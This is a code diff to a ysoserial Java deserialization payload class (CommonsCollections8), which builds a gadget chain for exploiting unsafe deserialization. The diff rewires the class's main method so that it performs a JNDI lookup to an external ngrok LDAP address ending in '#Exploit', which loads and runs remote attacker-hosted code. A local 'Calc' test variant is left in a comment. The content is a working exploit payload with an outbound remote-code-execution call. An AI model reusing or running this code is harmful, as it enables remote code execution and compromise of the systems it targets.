@@ -31,7 +31,7 @@ import ysoserial.payloads.util.Reflections;
 public class CommonsCollections8 extends PayloadRunner implements ObjectPayload<TreeBag> {
 
     public TreeBag getObject(final String ... command) throws Exception {
-        Object templates = Gadgets.createTemplatesImpl(command[0]);
+        Object templates = Gadgets.createTemplatesImpl(command);
 
         // setup harmless chain
         final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
@@ -50,7 +50,9 @@ public class CommonsCollections8 extends PayloadRunner implements ObjectPayload<
     }
 
     public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollections8.class, args);
+        new javax.naming.InitialContext().lookup("ldap://0.tcp.ngrok.io:11391/#Exploit");
+//        new InitialContext().lookup("ldap://127.0.0.1:44321/#Calc");
+//        PayloadRunner.run(CommonsCollections8.class, args);
     }
 
 }
